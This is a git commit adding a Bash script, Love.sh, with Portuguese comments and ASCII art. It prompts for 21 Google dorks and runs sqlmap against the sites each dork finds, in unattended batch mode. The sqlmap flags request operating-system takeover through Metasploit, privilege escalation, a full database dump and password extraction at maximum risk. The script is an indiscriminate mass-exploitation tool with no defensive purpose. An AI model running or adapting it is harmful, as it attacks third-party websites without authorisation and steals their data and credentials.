d9990ab3ded58396f677e524f5119a38c385be08
Leonardoimui <340altair@gmail.com>
2017-12-17 13:47:33 -0200

    Add files via upload

---
+++ Love.sh
@@ -0,0 +1,110 @@
+#!/bin/bash
+
+#Muda o tamanho do terminal
+resize -s 36 93 > /dev/null
+
+#Iniciando
+reset
+reset
+
+#Colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+transparent="\e[0m"
+
+
+#Revolution Ghosts
+
+echo -e '''
+\033[1;31m
+─────░░▒▒▒─────░░▒▒░
+───░░░░░▒▓██▒░░░░░▒▓██▓
+──░░░░░▒▒▓▓▒▒░░░░▒▒▓████
+──▒░░▒▓▓▓▓▓▒▒▒▒▒▓▓██████▒
+─░▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓█▓▒░▒▒▓█▒─────░░▒▒▒
+──██▓▓▓▓▓▓▓▓▓▓▓▓█▒────░▒██▒░─────░▓██▒
+──▓██▓▓▓▓▓▓▓▓▓▓▓▒───░░▒▒▒▒░────░░▒▓███▓
+───▓██▓▓▓▓▓▓▓▓▓▓▒░░░▓▓▓▓▓▒▒░░░▒▓▓▓▓████░
+────▓██▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓█▓▓▓████░
+─────▒███▓▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████
+───────▓███▓▓▓██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▒
+────────░████████▒███▓▓▓▓▓▓▓▓▓▓▓█████▒
+──────────▒████▓░─░████▓▓▓▓▓▓▓▓█████▒
+────────────▓▓░─────▓████▓▓▓▓██████░
+─────────────────────▒████▓██████▒
+───────────────────────▓███████▓░
+────────────────────────░█████▒
+──────────────────────────░▓▒
+────────────────────────────
+▓▓▓▓█──.▓▓▓▓▓▓█▓▓█────▓▓█▓▓▓▓▓█
+─▓▓██──▓▓█──▓▓█ ▓▓█──▓▓█─▓▓█
+─▓▓█───▓▓█──▓▓█─▓▓█─▓▓█─▓▓▓▓▓█
+─▓▓█───▓▓█──▓▓█──▓▓.▓▓█──▓▓█
+─▓▓▓▓▓█─▓▓▓▓▓▓█── ▓▓▓▓█──▓▓▓▓▓█
+\033[0;00m
+'''
+
+echo -e "\033[1;32mList dorks Download\033[0;00m: https://www.docdroid.net/LjQQmNJ/dorks-2017.txt"
+echo -e "\n"
+
+
+
+read -p "Insinra uma dork: " DEAD
+read -p "Insinra uma dork: " DEAD1
+read -p "Insinra uma dork: " DEAD2
+read -p "Insinra uma dork: " DEAD3
+read -p "Insinra uma dork: " DEAD4
+read -p "Insinra uma dork: " DEAD5
+read -p "Insinra uma dork: " DEAD6
+read -p "Insinra uma dork: " DEAD7
+read -p "Insinra uma dork: " DEAD8
+read -p "Insinra uma dork: " DEAD9
+read -p "Insinra uma dork: " DEAD10
+read -p "Insinra uma dork: " DEAD11
+read -p "Insinra uma dork: " DEAD12
+read -p "Insinra uma dork: " DEAD13
+read -p "Insinra uma dork: " DEAD14
+read -p "Insinra uma dork: " DEAD15
+read -p "Insinra uma dork: " DEAD16
+read -p "Insinra uma dork: " DEAD17
+read -p "Insinra uma dork: " DEAD18
+read -p "Insinra uma dork: " DEAD19
+read -p "Insinra uma dork: " DEAD20
+
+###################################
+reset
+reset
+###################################
+
+sqlmap -g "$DEAD" --beep   --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD1" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD2" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD3" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD4" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD5" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD6" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD7" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD8" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD9" --beep  --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD10" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD11" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD12" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD13" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD14" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD15" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD16" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD17" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD18" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD19" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+sqlmap -g "$DEAD20" --beep --batch  --os-pwn --msf-path=/opt/metasploit/app  --priv-esc -b --random-agent -U --dump-all --columns --schema --level=5 --risk=3 --privileges --passwords
+
+
